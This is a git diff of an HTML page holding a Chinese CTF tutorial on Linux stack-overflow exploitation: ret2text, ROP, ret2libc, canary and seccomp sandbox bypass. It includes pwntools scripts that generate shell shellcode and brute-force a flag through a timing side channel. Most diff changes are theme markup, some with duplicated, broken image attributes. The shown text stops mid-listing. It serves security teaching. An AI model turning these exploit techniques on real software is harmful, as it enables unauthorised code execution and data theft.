@@ -44,7 +44,7 @@
 <meta property="og:image" content="https://skyi23.github.io/2024/11/08/linux-stack-overflow/images/e3e1b6a53bd2c560f2b08fc27d87d60d.png">
 <meta property="og:image" content="https://skyi23.github.io/2024/11/08/linux-stack-overflow/images/d69ea986473e28e4a4ac62a88a12edec.png">
 <meta property="article:published_time" content="2024-11-07T19:10:56.005Z">
-<meta property="article:modified_time" content="2024-11-18T04:47:24.200Z">
+<meta property="article:modified_time" content="2024-11-19T19:33:31.701Z">
 <meta property="article:author" content="John Doe">
 <meta property="article:tag" content="linux user pwn">
 <meta name="twitter:card" content="summary">
@@ -52,10 +52,10 @@
     
     
     <!--- Icon Part-->
-    <link rel="icon" type="image/png" href="/images/icon.jpg" sizes="192x192">
-    <link rel="apple-touch-icon" sizes="180x180" href="/images/icon.jpg">
+    <link rel="icon" type="image/png" href="/null" sizes="192x192">
+    <link rel="apple-touch-icon" sizes="180x180" href="/null">
     <meta name="theme-color" content="#A31F34">
-    <link rel="shortcut icon" href="/images/icon.jpg">
+    <link rel="shortcut icon" href="/null">
     <!--- Page Info-->
     
     <title>
@@ -77,7 +77,7 @@
 
     
         
-<link rel="stylesheet" href="/assets/build/styles.css">
+<link rel="stylesheet" href="/build/css/tailwind.css">
 
     
 
@@ -99,7 +99,7 @@
 
     <script id="hexo-configurations">
     window.config = {"hostname":"skyi23.github.io","root":"/","language":"en","path":"search.xml"};
-    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center","image_caption":false,"link_icon":true,"title_alignment":"left","headings_top_spacing":{"h1":"3.2rem","h2":"2.4rem","h3":"1.9rem","h4":"1.6rem","h5":"1.4rem","h6":"1.3rem"}},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":false,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","highlight_theme":{"light":"github","dark":"vs2015"},"font":{"enable":true,"family":"JetBrains Mono","url":"https://fonts.googleapis.com/css2?family=JetBrains+Mono&display=swap"}},"toc":{"enable":true,"max_depth":4,"number":false,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"cc_by_nc_sa"},"lazyload":true,"recommendation":{"enable":false,"title":"推荐阅读","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#A31F34","secondary":null,"default_mode":"light"},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null},"title":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":true,"percentage":true},"website_counter":{"url":"https://cn.vercount.one/js","enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"preloader":{"enable":false,"custom_message":null},"open_graph":true,"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/wallhaven-wqery6-light.webp","dark":"/images/wallhaven-wqery6-dark.webp"},"title":"sky123's blog","subtitle":{"text":["书有未曾经我读，事无不可对人言"],"hitokoto":{"enable":false,"show_author":false,"api":"https://v1.hitokoto.cn"},"typing_speed":100,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":false,"style":"default","links":{"github":null,"instagram":null,"zhihu":null,"twitter":null,"email":null},"qrs":{"weixin":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null,"lrc":null}]},"mermaid":{"enable":true,"version":"9.3.0"}},"version":"2.7.3","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"width":{"home":"1200px","pages":"1000px"},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"},"分类":{"icon":"fa-solid fa-folder","path":"/categories/"},"标签":{"icon":"fa-solid fa-tags","path":"/tags/"}},"search":{"enable":true,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"info","announcement":null,"show_on_mobile":true,"links":null},"article_date_format":"auto","excerpt_length":200,"categories":{"enable":true,"limit":3},"tags":{"enable":true,"limit":3}},"footerStart":"2022/8/17 11:45:14"};
+    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center","image_caption":false,"link_icon":true,"title_alignment":"left","headings_top_spacing":{"h1":"3.2rem","h2":"2.4rem","h3":"1.9rem","h4":"1.6rem","h5":"1.4rem","h6":"1.3rem"}},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":true,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","highlight_theme":{"light":"github","dark":"vs2015"},"font":{"enable":true,"family":"JetBrains Mono","url":"https://fonts.googleapis.com/css2?family=JetBrains+Mono&display=swap"}},"toc":{"enable":true,"max_depth":5,"number":false,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"cc_by_nc_sa"},"lazyload":true,"recommendation":{"enable":false,"title":"推荐阅读","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#A31F34","secondary":null,"default_mode":"light"},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null},"title":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":true,"percentage":true},"website_counter":{"url":"https://cn.vercount.one/js","enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"preloader":{"enable":false,"custom_message":null},"open_graph":true,"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/wallhaven-wqery6-light.webp","dark":"/images/wallhaven-wqery6-dark.webp"},"title":"sky123's blog","subtitle":{"text":["书有未曾经我读，事无不可对人言"],"hitokoto":{"enable":false,"show_author":false,"api":"https://v1.hitokoto.cn"},"typing_speed":100,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":false,"style":"default","links":{"github":null,"instagram":null,"zhihu":null,"twitter":null,"email":null},"qrs":{"weixin":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null,"lrc":null}]},"mermaid":{"enable":true,"version":"9.3.0"}},"version":"2.8.0","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"width":{"home":"1200px","pages":"1000px"},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"},"分类":{"icon":"fa-solid fa-folder","path":"/categories/"},"标签":{"icon":"fa-solid fa-tags","path":"/tags/"}},"search":{"enable":true,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":null,"show_on_mobile":true,"links":null},"article_date_format":"auto","excerpt_length":200,"categories":{"enable":true,"limit":3},"tags":{"enable":true,"limit":3}},"footerStart":"2024/11/7 00:00:00"};
     window.lang_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
     window.data = {"masonry":false};
   </script>
@@ -124,31 +124,28 @@
 <!-- hexo injector head_end start --><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.15.3/dist/katex.min.css" integrity="sha256-TThEtR+XalhWKkfF383YLOrI50NGNeIqrzS+q08afrY=" crossorigin="anonymous"><!-- hexo injector head_end end --><meta name="generator" content="Hexo 7.3.0"></head>
 
 
+
 <body>
-<div class="progress-bar-container">
-    
-        <span class="scroll-progress-bar"></span>
-    
+	<div class="progress-bar-container">
+	
+	<span class="scroll-progress-bar"></span>
+	
 
-    
-        <span class="pjax-progress-bar"></span>
-<!--        <span class="swup-progress-icon">-->
-<!--            <i class="fa-solid fa-circle-notch fa-spin"></i>-->
-<!--        </span>-->
-    
+	
+	<span class="pjax-progress-bar"></span>
+	<!--        <span class="swup-progress-icon">-->
+	<!--            <i class="fa-solid fa-circle-notch fa-spin"></i>-->
+	<!--        </span>-->
+	
 </div>
-
-
 
 <main class="page-container" id="swup">
 
-    
+	
 
-    <div class="main-content-container flex flex-col justify-between min-h-dvh">
-
-
-        <div class="main-content-header">
-            <header class="navbar-container px-6 md:px-12">
+	<div class="main-content-container flex flex-col justify-between min-h-dvh">
+		<div class="main-content-header">
+			<header class="navbar-container px-6 md:px-12">
     <div class="navbar-content transition-navbar ">
         <div class="left">
             
@@ -325,38 +322,37 @@
 </header>
 
 
-        </div>
+		</div>
 
-        <div class="main-content-body">
+		<div class="main-content-body transition-fade-up">
+			
 
-            
+			<div class="main-content">
+				<div class="post-page-container flex relative justify-between box-border w-full h-full">
+	<div class="article-content-container">
 
-            <div class="main-content">
+		<div class="article-title relative w-full">
+			
+			<div class="w-full flex items-center pt-6 justify-start">
+				<h1 class="article-title-regular text-second-text-color tracking-tight text-4xl md:text-6xl font-semibold px-2 sm:px-6 md:px-8 py-3">linux 栈溢出</h1>
+			</div>
+			
+		</div>
 
-                
-                    <div class="post-page-container flex relative justify-between box-border w-full h-full">
-    <div class="article-content-container">
-
-        <div class="article-title relative w-full">
-            
-                <div class="w-full flex items-center pt-6 justify-start">
-                    <h1 class="article-title-regular text-second-text-color tracking-tight text-4xl md:text-6xl font-semibold px-2 sm:px-6 md:px-8 py-3">linux 栈溢出</h1>
-                </div>
-            
-            </div>
-
-        
-            <div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
-                <div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
-                    <img src="/images/icon.jpg">
-                </div>
-                <div class="info flex flex-col justify-between">
-                    <div class="author flex items-center">
-                        <span class="name text-default-text-color text-lg font-semibold">sky123</span>
-                        
-                    </div>
-                    <div class="meta-info">
-                        <div class="article-meta-info">
+		
+		<div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
+			<div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
+				<img src="/images/icon.jpg">
+			</div>
+			<div class="info flex flex-col justify-between">
+				<div class="author flex items-center">
+					<span class="name text-default-text-color text-lg font-semibold">sky123</span>
+					
+					<span class="author-label ml-1.5 text-xs px-2 py-0.5 rounded-small text-third-text-color border border-shadow-color-1">Lv3</span>
+					
+				</div>
+				<div class="meta-info">
+					<div class="article-meta-info">
     <span class="article-date article-meta-item">
         <i class="fa-regular fa-pen-fancy"></i>&nbsp;
         <span class="desktop">2024-11-08 03:10:56</span>
@@ -366,8 +362,8 @@
     
         <span class="article-date article-meta-item">
             <i class="fa-regular fa-wrench"></i>&nbsp;
-            <span class="desktop">2024-11-18 12:47:24</span>
-            <span class="mobile">2024-11-18 12:47:24</span>
+            <span class="desktop">2024-11-20 03:33:31</span>
+            <span class="mobile">2024-11-20 03:33:31</span>
             <span class="hover-info">Updated</span>
         </span>
     
@@ -430,16 +426,16 @@
     
 </div>
 
-                    </div>
-                </div>
-            </div>
-        
+				</div>
+			</div>
+		</div>
+		
 
-        
+		
 
 
-        <div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
-            <h1 id="逻辑漏洞">逻辑漏洞</h1>
+		<div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
+			<h1 id="逻辑漏洞">逻辑漏洞</h1>
 <p>栈溢出往往可以覆盖栈上的其他局部变量造成逻辑漏洞。</p>
 <h1 id="ret2text">ret2text</h1>
 <p>栈溢出覆盖返回地址为后门函数从而获取shell。</p>
@@ -490,7 +486,7 @@
 </ul></li>
 </ul>
 <h2 id="纯-ascii-码-shellcode">纯 ascii 码 shellcode</h2>
-<p><a class="link"   target="_blank" rel="noopener" href="https://github.com/TaQini/alpha3" >alpha3 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>
+<p><a class="link"   target="_blank" rel="noopener" href="https://github.com/TaQini/alpha3" >alpha3<i class="fa-sharp fa-regular fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em]"></i>
 项目可以实现可见 shellcode 。</p>
 <div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">fp = <span class="built_in">open</span>(<span class="string">&quot;shellcode&quot;</span>, <span class="string">&quot;wb+&quot;</span>)</span><br><span class="line">fp.write(asm(shellcraft.sh()))</span><br><span class="line">fp.close()</span><br><span class="line"></span><br><span class="line">shellcode = os.popen(<span class="string">&quot;python ./alpha3/ALPHA3.py x64 ascii mixedcase rax --input=shellcode&quot;</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> shellcode</span><br></pre></td></tr></table></figure></div>
 <p><strong>注意：alpha3 生成 shellcode 时如果设置 rax 那么跳转至
@@ -540,12 +536,17 @@ alarm 并控制交互时间来控制 eax 寄存器的值。</li>
 <li>ecx = 0x0</li>
 <li>edx = 0x0</li>
 </ul>
-<p>rop示例： <img  
+<p>rop示例： <img   
+                     lazyload
+                     src="/images/loading.svg"
+                     data-
                      lazyload
                      src="/images/loading.svg"
                      data-src="images/0386c58178b9c5d125f63daaba1d0ab2.png"
                      
+                     
 alt="图片" 
+                
                 ></p>
 <h2 id="位-1">64位</h2>
 <ul>
@@ -554,12 +555,17 @@ alt="图片"
 <li>rsi = 0x0</li>
 <li>rdx = 0x0</li>
 </ul>
-<p>rop示例： <img  
+<p>rop示例： <img   
+                     lazyload
+                     src="/images/loading.svg"
+                     data-
                      lazyload
                      src="/images/loading.svg"
                      data-src="images/513d283d1e58ea87558b0a1c7be5f06a.png"
                      
+                     
 alt="图片" 
+                
                 ></p>
 <h1 id="ret2libc">ret2libc</h1>
 <h2 id="linux延迟绑定机制">linux延迟绑定机制</h2>
@@ -573,11 +579,16 @@ Global Offset
 Table），那个存放额外代码的表称为<strong>程序链接表</strong>（<strong>PLT</strong>，Procedure
 Link Table）</p>
 <figure>
-<img  
+<img   
+                     lazyload
+                     src="/images/loading.svg"
+                     data-
                      lazyload
                      src="/images/loading.svg"
                      data-src="images/71e04df6969db4f75dcf43f09246a92b.png"
+                     
                       alt="图片" 
+                
                 >
 <figcaption aria-hidden="true">图片</figcaption>
 </figure>
@@ -587,23 +598,29 @@ Link Table）</p>
 表已经获取了正确的地址，但是在一开始就进行所有函数的重定位是比较麻烦的，为此，linux
 引入了延迟绑定机制：只有动态库函数在被调用时，才会地址解析和重定位工作。</p>
 <p>举例：</p>
-<p>第一次调用 <img  
+<p>第一次调用 <img   
+                     lazyload
+                     src="/images/loading.svg"
+                     data-
                      lazyload
                      src="/images/loading.svg"
                      data-src="images/5dfa1cfa3febe69de060b44636b1d515.png"
                      
-alt="在这里插入图片描述" 
-                > 之后再次调用</p>
-<figure>
-<img  
+                      
+                
+                >
+之后再次调用</p>
+<p><img   
+                     lazyload
+                     src="/images/loading.svg"
+                     data-
                      lazyload
                      src="/images/loading.svg"
                      data-src="images/c1fdf7342f4974e396840a515fd5cafe.png"
                      
-alt="在这里插入图片描述" 
-                >
-<figcaption aria-hidden="true">在这里插入图片描述</figcaption>
-</figure>
+                      
+                
+                ></p>
 <h2 id="利用过程">利用过程</h2>
 <h3 id="泄露函数地址">泄露函数地址</h3>
 <p>泄露libc函数地址的条件：程序中有输出函数，例如puts/printf/write</p>
@@ -611,12 +628,17 @@ alt="在这里插入图片描述"
 <ul>
 <li><p>32位</p>
 <figure>
-<img  
+<img   
+                     lazyload
+                     src="/images/loading.svg"
+                     data-
                      lazyload
                      src="/images/loading.svg"
                      data-src="images/467d83f627ee475bff7982574983ebbb.png"
                      
+                     
 alt="image-20220201201536794" 
+                
                 >
 <figcaption aria-hidden="true">image-20220201201536794</figcaption>
 </figure></li>
@@ -624,16 +646,17 @@ alt="image-20220201201536794"
 <p>需要控制三个参数，rdi，rsi，rdx</p>
 <p>第三个参数代表输出的size，如果没有rdx的gadget可以暂时不管，输出多少无所谓。</p></li>
 </ul>
-<figure>
-<img  
+<p><img   
+                     lazyload
+                     src="/images/loading.svg"
+                     data-
                      lazyload
                      src="/images/loading.svg"
                      data-src="images/d0960c383618941fa65bf62b257c8f79.png"
                      
-alt="在这里插入图片描述" 
-                >
-<figcaption aria-hidden="true">在这里插入图片描述</figcaption>
-</figure>
+                      
+                
+                ></p>
 <p>截取泄露的函数地址</p>
 <ul>
 <li><p>32位</p>
@@ -689,11 +712,11 @@ argv[0]，这个参数保存在栈中，如果可以覆盖该参数，也就可�
 命令可以快速定位出 canary 的位置。</li>
 </ul>
 <p><a class="link" 
- target="_blank" rel="noopener" href="https://gitcode.net/qq_45323960/attachment/-/tree/master/glibc_pwn/pwn_cc2c970b6ae5033b88ec97722344e326" >例题 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+ target="_blank" rel="noopener" href="https://gitcode.net/qq_45323960/attachment/-/tree/master/glibc_pwn/pwn_cc2c970b6ae5033b88ec97722344e326" >例题<i class="fa-sharp fa-regular fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em]"></i></p>
 <p>另外如果题目中申请的 chunk 大小限制不能很大，无法触发 mmap 且只能申请
 1 次，那么就无法通过堆溢出修改 canary 。</p>
 <p>但是像<a class="link" 
- target="_blank" rel="noopener" href="https://gitcode.net/qq_45323960/attachment/-/tree/master/glibc_pwn/21st_century" >这道题 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>可以通过栈溢出伪造环境变量添加
+ target="_blank" rel="noopener" href="https://gitcode.net/qq_45323960/attachment/-/tree/master/glibc_pwn/21st_century" >这道题<i class="fa-sharp fa-regular fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em]"></i>可以通过栈溢出伪造环境变量添加
 <code>MALLOC_MMAP_THRESHOLD_=1</code> ，这样即使 malloc 很小的 chunk
 也会触发 mmap 分配内存，因此同样可以覆盖 canary 。</p>
 <h1 id="沙箱绕过">沙箱绕过</h1>
@@ -805,7 +828,7 @@ sudo）。</p>
 <div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">0000: 0x20 0x00 0x00 0x00000004  A = arch</span><br><span class="line">0001: 0x15 0x00 0x07 0xc000003e  if (A != ARCH_X86_64) goto 0009</span><br><span class="line">0002: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line">0003: 0x15 0x05 0x00 0x00000002  if (A == open) goto 0009</span><br><span class="line">0004: 0x15 0x04 0x00 0x00000009  if (A == mmap) goto 0009</span><br><span class="line">0005: 0x15 0x03 0x00 0x00000065  if (A == ptrace) goto 0009</span><br><span class="line">0006: 0x15 0x02 0x00 0x00000101  if (A == openat) goto 0009</span><br><span class="line">0007: 0x15 0x01 0x00 0x00000130  if (A == open_by_handle_at) goto 0009</span><br><span class="line">0008: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line">0009: 0x06 0x00 0x00 0x00000000  return KILL</span><br></pre></td></tr></table></figure></div>
 <h3 id="使用-32-位-shellcode-绕过">使用 32 位 shellcode 绕过</h3>
 <p>例如这道<a class="link" 
- target="_blank" rel="noopener" href="https://gitcode.net/qq_45323960/attachment/-/tree/master/glibc_pwn/27" >题目 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>，该题目的沙箱规则如下：</p>
+ target="_blank" rel="noopener" href="https://gitcode.net/qq_45323960/attachment/-/tree/master/glibc_pwn/27" >题目<i class="fa-sharp fa-regular fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em]"></i>，该题目的沙箱规则如下：</p>
 <div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">➜ seccomp-tools dump ./pwn</span><br><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> 0000: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line"> 0001: 0x35 0x00 0x01 0x40000000  if (A &lt; 0x40000000) goto 0003</span><br><span class="line"> 0002: 0x15 0x00 0x04 0xffffffff  if (A != 0xffffffff) goto 0007</span><br><span class="line"> 0003: 0x15 0x02 0x00 0x00000000  if (A == read) goto 0006</span><br><span class="line"> 0004: 0x15 0x01 0x00 0x00000001  if (A == write) goto 0006</span><br><span class="line"> 0005: 0x15 0x00 0x01 0x00000005  if (A != fstat) goto 0007</span><br><span class="line"> 0006: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line"> 0007: 0x06 0x00 0x00 0x00000000  return KILL</span><br></pre></td></tr></table></figure></div>
 <p>可以看到这个沙箱规则没有判断 <code>A != ARCH_X86_64</code>
 的情况，因此可以使用如下 shellcode 切换到 32 位完成 orw 。位数切换是通过
@@ -822,14 +845,14 @@ flag</h3>
 相关的系统调用（有的题目是关闭了输出流）则需要采用 shellcode 侧信道爆破
 flag 。</p>
 <p>例如这道<a class="link" 
- target="_blank" rel="noopener" href="https://gitcode.net/qq_45323960/attachment/-/tree/master/glibc_pwn/30" >题目 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+ target="_blank" rel="noopener" href="https://gitcode.net/qq_45323960/attachment/-/tree/master/glibc_pwn/30" >题目<i class="fa-sharp fa-regular fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em]"></i></p>
 <p>这里有一个判断进程是否退出的技巧：<code>p.recv(timeout=1)</code>
 。如果进程已经结束会触发异常，而进程未结束但没有输出导致超时则接收数据长度为
 0 ，并不会触发异常。</p>
 <div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment"># libc = ELF(&quot;./libc.so.6&quot;)</span></span><br><span class="line">context(arch=elf.arch, os=elf.os)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">c</span>):</span><br><span class="line">    p = process([elf.path])</span><br><span class="line">    shellcode = asm(<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">            push 0x67616c66</span></span><br><span class="line"><span class="string">            mov rdi, rsp</span></span><br><span class="line"><span class="string">            xor esi, esi</span></span><br><span class="line"><span class="string">            push 2</span></span><br><span class="line"><span class="string">            pop rax</span></span><br><span class="line"><span class="string">            syscall</span></span><br><span class="line"><span class="string">            mov rdi, rax</span></span><br><span class="line"><span class="string">            mov rsi, rsp</span></span><br><span class="line"><span class="string">            mov edx, 0x100</span></span><br><span class="line"><span class="string">            xor eax, eax</span></span><br><span class="line"><span class="string">            syscall</span></span><br><span class="line"><span class="string">            mov dl, [rsp + &#123;&#125;]</span></span><br><span class="line"><span class="string">            cmp dl, &#123;&#125;</span></span><br><span class="line"><span class="string">            jbe $</span></span><br><span class="line"><span class="string">            &quot;&quot;&quot;</span>.<span class="built_in">format</span>(i, c))</span><br><span class="line">    p.send(shellcode)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        p.recv(timeout=<span class="number">1</span>)</span><br><span class="line">        p.kill()</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        p.close()</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    l = <span class="number">0x20</span></span><br><span class="line">    r = <span class="number">0x7f</span></span><br><span class="line">    <span class="keyword">while</span> l &lt; r:</span><br><span class="line">        m = (l + r) // <span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span> check(m):</span><br><span class="line">            r = m</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            l = m + <span class="number">1</span></span><br><span class="line">    flag += <span class="built_in">chr</span>(l)</span><br><span class="line">    log.info(flag)</span><br><span class="line">    i += <span class="number">1</span></span><br></pre></td></tr></table></figure></div>
 <h3 id="使用-close-绕过-fd-参数检查">使用 close 绕过 fd 参数检查</h3>
 <p>例如这道<a class="link" 
- target="_blank" rel="noopener" href="https://gitcode.net/qq_45323960/attachment/-/tree/master/glibc_pwn/33%20xl" >题目 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>的沙箱规定
+ target="_blank" rel="noopener" href="https://gitcode.net/qq_45323960/attachment/-/tree/master/glibc_pwn/33%20xl" >题目<i class="fa-sharp fa-regular fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em]"></i>的沙箱规定
 <code>read</code> 的 fd 必须为 0 ，即只能从标准输入读入。</p>
 <div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">➜ seccomp-tools dump ./pwn</span><br><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> 0000: 0x20 0x00 0x00 0x00000004  A = arch</span><br><span class="line"> 0001: 0x15 0x00 0x04 0xc000003e  if (A != ARCH_X86_64) goto 0006</span><br><span class="line"> 0002: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line"> 0003: 0x15 0x00 0x01 0x000000e7  if (A != exit_group) goto 0005</span><br><span class="line"> 0004: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line"> 0005: 0x25 0x00 0x01 0x00000110  if (A &lt;= 0x110) goto 0007</span><br><span class="line"> 0006: 0x06 0x00 0x00 0x00000000  return KILL</span><br><span class="line"> 0007: 0x15 0x00 0x01 0x00000002  if (A != open) goto 0009</span><br><span class="line"> 0008: 0x06 0x00 0x00 0x00000000  return KILL</span><br><span class="line"> 0009: 0x15 0x00 0x05 0x00000000  if (A != read) goto 0015</span><br><span class="line"> 0010: 0x20 0x00 0x00 0x00000014  A = fd &gt;&gt; 32 # read(fd, buf, count)</span><br><span class="line"> 0011: 0x15 0x00 0x04 0x00000000  if (A != 0x0) goto 0016</span><br><span class="line"> 0012: 0x20 0x00 0x00 0x00000010  A = fd # read(fd, buf, count)</span><br><span class="line"> 0013: 0x15 0x00 0x02 0x00000000  if (A != 0x0) goto 0016</span><br><span class="line"> 0014: 0x06 0x00 0x00 0x7fff0000  return 